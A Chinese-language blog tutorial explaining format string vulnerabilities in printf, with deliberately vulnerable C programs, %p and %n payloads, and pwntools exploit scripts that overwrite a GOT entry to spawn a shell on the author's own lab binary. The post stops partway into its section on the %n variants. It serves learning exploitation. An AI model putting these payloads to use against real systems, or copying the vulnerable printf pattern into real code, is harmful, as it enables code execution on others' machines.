<!doctype html>



  


<html class="theme-next muse use-motion">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">



<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">












  
  
  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css">


  <meta name="keywords" content="PWN总结,">




  


  <link rel="alternate" href="/atom.xml" title="mutou-jun's blog" type="application/atom+xml">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1">






<meta name="description" content="这里记录了 常见格式化字符串的漏洞的知识和利用。（注，关于bss 段上的格式化字符串 忘记写了，回头补充下！）">
<meta name="keywords" content="PWN总结">
<meta property="og:type" content="article">
<meta property="og:title" content="格式化字符串漏洞及利用_完全讲解">
<meta property="og:url" content="http://yoursite.com/2020/04/26/格式化字符串漏洞及利用_完全讲解/index.html">
<meta property="og:site_name" content="mutou-jun&#39;s blog">
<meta property="og:description" content="这里记录了 常见格式化字符串的漏洞的知识和利用。（注，关于bss 段上的格式化字符串 忘记写了，回头补充下！）">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://s1.ax1x.com/2020/03/26/8zSXB4.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/03/26/8zSOuF.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/03/26/8zSqjU.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/03/26/8zSbcT.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/03/26/8zSH3V.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/03/26/8zSjHJ.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/03/26/8zSxE9.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/03/26/8zSzNR.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/03/26/8zpS41.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/03/26/8zp99x.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/03/26/8zpC36.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/03/26/8zpPgK.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/03/26/8zpijO.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/03/26/8zpkuD.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/03/26/8zpEHH.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/03/26/8zpZEd.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/03/26/8zpeUA.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/03/26/8zpm4I.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/03/26/8zpuCt.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/03/26/8zpK8P.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/03/26/8zpMgf.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/03/26/8zpQv8.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/03/26/8zp1KS.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/03/26/8zp8bQ.png">
<meta property="og:updated_time" content="2020-04-26T13:54:37.101Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="格式化字符串漏洞及利用_完全讲解">
<meta name="twitter:description" content="这里记录了 常见格式化字符串的漏洞的知识和利用。（注，关于bss 段上的格式化字符串 忘记写了，回头补充下！）">
<meta name="twitter:image" content="https://s1.ax1x.com/2020/03/26/8zSXB4.png">



<script type="text/javascript" id="hexo.configuration">
  var NexT = window.NexT || {};
  var CONFIG = {
    scheme: 'Muse',
    sidebar: {"position":"right","display":"always"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: 0,
      author: '博主'
    }
  };
</script>

  <title> 格式化字符串漏洞及利用_完全讲解 | mutou-jun's blog </title>
</head>



   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas> 
   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
   <script type="text/javascript" src="/js/src/fireworks.js"></script>


<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  










  
  
    
  

  <div class="container one-collumn sidebar-position-right page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">mutou-jun's blog</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
  <p class="site-subtitle"></p>
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      

      
    </ul>
  

  
</nav>

 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                格式化字符串漏洞及利用_完全讲解
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2020-04-26T21:50:46+08:00" content="2020-04-26">
              2020-04-26
            </time>
          </span>

          

          
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>这里记录了 常见格式化字符串的漏洞的知识和利用。（注，关于bss 段上的格式化字符串 忘记写了，回头补充下！）</p>
<a id="more"></a>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>格式化字符串漏洞 具有 任意地址读，任意地址写。</p>
<h1 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h1><h3 id="printf-–一个参数：情况1"><a href="#printf-–一个参数：情况1" class="headerlink" title="printf –一个参数：情况1"></a>printf –一个参数：情况1</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g -m32 fmt.c -o fmt</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当参数 只有 1个字符串的话(含有%?)，  //？  即 i， x， s 等等<br><br>第一个参数 作为 格式化字符串，<br><br>而这个格式化字符串里含有解析 字符串的 %p ，它将<br>第一个参数作为 格式化字符串，<br><br>第二个参数 作为 格式化字符串的参数表 中的第一个参数 即 %p 对应 栈中 0xffffd144 的内容，//它将栈中 0xffffd144 的内容 以带有0x 的16进制显示出来。<br><br>（32位 程序传参方式 传到栈上，栈地址 0xffffd144 中的内容为 第二个参数）<br><img src="https://s1.ax1x.com/2020/03/26/8zSXB4.png" alt="8zSXB4.png"></p>
<p><img src="https://s1.ax1x.com/2020/03/26/8zSOuF.png" alt="8zSOuF.png"></p>
<h3 id="printf-–一个参数：情况2"><a href="#printf-–一个参数：情况2" class="headerlink" title="printf –一个参数：情况2"></a>printf –一个参数：情况2</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g -m32 fmt.c -o fmt</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"yangmutou!!!\n"</span>); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当参数 只有 1个字符串的话(不含有%?)，在Linux中会 被转化为puts(arg)    //？  即 i， x， s 等等<br><img src="https://s1.ax1x.com/2020/03/26/8zSqjU.png" alt="8zSqjU.png"></p>
<h3 id="printf-–两个参数："><a href="#printf-–两个参数：" class="headerlink" title="printf –两个参数："></a>printf –两个参数：</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g -m32 fmt.c -o fmt</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[<span class="number">12</span>]=<span class="string">"yangmutou!!!"</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s!!!\n"</span>,a);    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当两个参数 时，<br><br>第一个参数作为 格式化字符串，<br><br>第二个参数 作为 格式化字符串的参数表 中的第一个参数 即 %s 对应 “yangmutou”<br><img src="https://s1.ax1x.com/2020/03/26/8zSbcT.png" alt="8zSbcT.png"></p>
<h3 id="printf-–三个参数："><a href="#printf-–三个参数：" class="headerlink" title="printf –三个参数："></a>printf –三个参数：</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g -m32 fmt.c -o fmt</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[<span class="number">12</span>]=<span class="string">"yangmutou!!!"</span>;</span><br><span class="line">    <span class="keyword">int</span> b=<span class="number">20</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s!!!\nage: %d\n"</span>,a,b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当三个参数 时，<br><br>第一个参数作为 格式化字符串，<br><br>第二个参数 作为 格式化字符串的参数表 中的第一个参数   即 %s 对应 “yangmutou”<br><br>第三个参数 作为 格式化字符串的参数表 中的第二个参数   即 %d 对应   20<br><img src="https://s1.ax1x.com/2020/03/26/8zSH3V.png" alt="8zSH3V.png"></p>
<h1 id="任意地址-读"><a href="#任意地址-读" class="headerlink" title="任意地址 读"></a>任意地址 读</h1><p>而这个函数是有漏洞的<br>我们简单 看下面我写的例子：</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g -m32 fmt.c -o fmt</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/sh\x00"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf,<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(&amp;buf);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以控制 printf 的参数。<br><br>我们输入 “aaaa%p.%p.%p.%p.%p.%p.%p.%p.%p.%p”到 0xffffd11c 栈地址处<br><img src="https://s1.ax1x.com/2020/03/26/8zSjHJ.png" alt="8zSjHJ.png"></p>
<ol>
<li>可以看到 我们输入的这一整个字符串 作为了  格式化字符串，<br></li>
<li>aaaa后面的第一个 %p 被 格式化字符串的参数表 中的第一个参数(0xffffd100+0x4*1中的内容) 解析成“0x + 16进制”0xffffd11c     然后替换掉<br></li>
<li>aaaa后面的第二个 %p 被 格式化字符串的参数表 中的第二个参数(0xffffd100+0x4*2中的内容) 解析成“0x + 16进制” 0x64            然后替换掉<br></li>
<li>aaaa后面的第二个 %p 被 格式化字符串的参数表 中的第三个参数(0xffffd100+0x4*3中的内容) 解析成“0x + 16进制” 0x5655561e  然后替换掉<br></li>
</ol>
<p>具体可以 看下面的 gdb 截图：<br><img src="https://s1.ax1x.com/2020/03/26/8zSxE9.png" alt="8zSxE9.png"></p>
<p>此时的栈：<br><img src="https://s1.ax1x.com/2020/03/26/8zSzNR.png" alt="8zSzNR.png"></p>
<p>另外 我们可以通过这种 方法  得到 ，第 7 个 %p 被替换成  0x61616161，即我们输入的 字符串 存到了 偏移 为 7 的 位置。<br>这里的偏移  可以理解为 上面 的 “格式化字符串的参数表 中的第 x 个参数”<br>另外  我们可以通过输入 %offset$p   直接输出 偏移为 7 处的内容(“0x + 16进制”)<br>试下 输出结果：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./fmt</span></span><br><span class="line"><span class="meta">aaaa%</span><span class="bash">7<span class="variable">$p</span></span></span><br><span class="line">aaaa0x61616161</span><br></pre></td></tr></table></figure>

<p>我们可以观察下   栈地址 0xffffd11c+0x4*2 处中的地址是个   指向字符串的指针<br><img src="https://s1.ax1x.com/2020/03/26/8zpS41.png" alt="8zpS41.png"></p>
<p>我们可以<br>输出结果：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">9</span><span class="variable">$s</span></span><br><span class="line"><span class="regexp">/home/y</span>angmutou<span class="regexp">/桌面/</span>fmt</span><br></pre></td></tr></table></figure>

<p>总结：即格式化漏洞的任意地址 读 其实仅需要 通过 “%偏移$格式输出” 便可以了，利用方式  很简单。<br>这里主要 就是 要特别 注意一点，这里的偏移 是指的格式化 字符串的第几个参数，而不是说是printf 函数的第几个参数呐，<br>因为 本来 格式化字符串   就是 printf 函数的第一个参数。两者 有 相差 1 的数学等式 关系。 </p>
<h1 id="任意地址-写"><a href="#任意地址-写" class="headerlink" title="任意地址 写"></a>任意地址 写</h1><p>我们还看  上面我写的小例子。</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/sh\x00"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(&amp;buf,<span class="number">0</span>,<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf,<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(&amp;buf);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为 不存在栈溢出，但我们要 getshell又 需要将 返回地址 给覆盖成 backdoor 地址。即需要利用格式化字符串漏洞的  任意地址写。</p>
<p>首先：</p>
<p>bss_addr : 0804a028   //readelf -S fmt | grep bss  得到<br>在格式化字符串 中 有一个 特殊的格式化控制符 “%n”，它可以将已经输出的字节个数写入到 指定的 的地址中<br>一般使用方式：<br>“\x28\xa0\x04\x08%7$n”,就是 将 已经输出的字节个数 写入到 指定的地址0x0804a028 处<br>（这里指定的地址处就是 偏移为7(格式化字符串的第7个参数) 的栈地址中的内容，即就是  我们写入的0x0804a024 指定地址）</p>
<p>payload 写成上面形式  理论上 是可以成功的，但我这次确失败了。<br>于是就写脚本形式吧。</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(<span class="string">"./fmt"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss_addr=0x0804a028</span><br><span class="line">offset=7</span><br><span class="line">payload=p32(bss_addr)+<span class="string">"%7$n"</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>输入之前：</p>
<p><img src="https://s1.ax1x.com/2020/03/26/8zp99x.png" alt="8zp99x.png"></p>
<p>输入 之后 ：</p>
<p><img src="https://s1.ax1x.com/2020/03/26/8zpC36.png" alt="8zpC36.png"></p>
<p>可以发现 4 被写入发 0x0804a024 中了   ,4即是p32(0x0804a024)的字节数。输出到屏幕上 的。</p>
<p>以上我们就算是演示下 任意写的 简单用法了。</p>
<p>而这题  我原本想的 是  将 backaddr 的地址写入 ret_addr,脚本如下：<br>但失败了，因为想法  就是错的。</p>
<p>如果我们采用 下面exp 的方法  ，是向 ret_addr 所在栈地址中的 内容 作为指针 ，向这个 指针中 写入  0x80484b6 。<br>而并不是 把 ret_addr 所在栈地址 作为指针，并不是向栈地址中写入 0x80484b6</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(<span class="string">"./fmt"</span>)</span><br><span class="line"></span><br><span class="line">backdoor=0x80484b6</span><br><span class="line">offset=(0x8c-0xc)/4+7</span><br><span class="line">payload=p32(backdoor)+<span class="string">"%"</span>+str(backdoor-4)+<span class="string">"c%"</span>+str(offset)+<span class="string">"$n"</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>所以 ，换思路：<br>我们 将printf_got 指针指向的 地址  改为  system_plt</p>
<p><img src="https://s1.ax1x.com/2020/03/26/8zpPgK.png" alt="8zpPgK.png"></p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(<span class="string">"./fmt"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./fmt"</span>)</span><br><span class="line">offset=7</span><br><span class="line">printf_got=elf.got['printf']<span class="comment">#0x0804a010</span></span><br><span class="line">system_plt=elf.plt['system']<span class="comment">#0x08048360</span></span><br><span class="line">print <span class="string">"printf_got is "</span>+hex(printf_got)</span><br><span class="line">print <span class="string">"system_plt is "</span>+hex(system_plt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=p32(printf_got)+<span class="string">"%"</span>+str(system_plt-4)+<span class="string">"c%7$n"</span><span class="comment"># make printf_got -&gt; system_plt</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>可以看到  printf_got 指针指向的 地址  改为了  system_plt</p>
<p>所以，printf(&amp;arg),就相当于 system(&amp;arg)了，如果我们再发送 “/bin/sh\x00”,作为arg 就能getshell了。<br>但 程序只能运行一次。</p>
<p> 为了学习。我们加上循环，重新编译。</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g -m32 -fno-stack-protector -no-pie -o fmt fmt.c    为了调试方便，关闭canary 和pie 保护</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/sh\x00"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">        <span class="built_in">memset</span>(&amp;buf,<span class="number">0</span>,<span class="number">100</span>);</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf,<span class="number">100</span>);</span><br><span class="line">        <span class="built_in">printf</span>(&amp;buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(<span class="string">"./fmt"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./fmt"</span>)</span><br><span class="line">offset=7</span><br><span class="line">printf_got=elf.got['printf']<span class="comment">#0x0804a010</span></span><br><span class="line">system_plt=elf.plt['system']<span class="comment">#0x08048360</span></span><br><span class="line">print <span class="string">"printf_got is "</span>+hex(printf_got)</span><br><span class="line">print <span class="string">"system_plt is "</span>+hex(system_plt)</span><br><span class="line"></span><br><span class="line">payload=p32(printf_got)+<span class="string">"%"</span>+str(system_plt-4)+<span class="string">"c%7$n"</span><span class="comment"># make printf_got -&gt; system_plt</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>成功 getshell！</p>
<p><img src="https://s1.ax1x.com/2020/03/26/8zpijO.png" alt="8zpijO.png"></p>
<h1 id="n系列"><a href="#n系列" class="headerlink" title="%n系列"></a>%n系列</h1><p>当这样构造payload  在比赛或者是 实际 漏洞利用时，往往会不会成功。因为一次行传输这么大量的字节 会导致网络卡顿或者中断连接。</p>
<p>我们再来了解下”%n“ 格式化字符的扩展(称不上 其实，就称为一个系列吧)</p>
<ol>
<li>%n  一次性写入4个字节</li>
<li>%hn  一次性写入2个字节</li>
<li>%hhn  一次性写入1个字节</li>
</ol>
<p>这个”%n”系列的 作用就是 向 指定的地址中写入 已经输出的字节个数。<br>用 “%偏移$n”(“%偏移$hn”,”%偏移$hhn”)  用偏移控制 指定地址。</p>
<p>我们稍微改造下 上面的exp：</p>
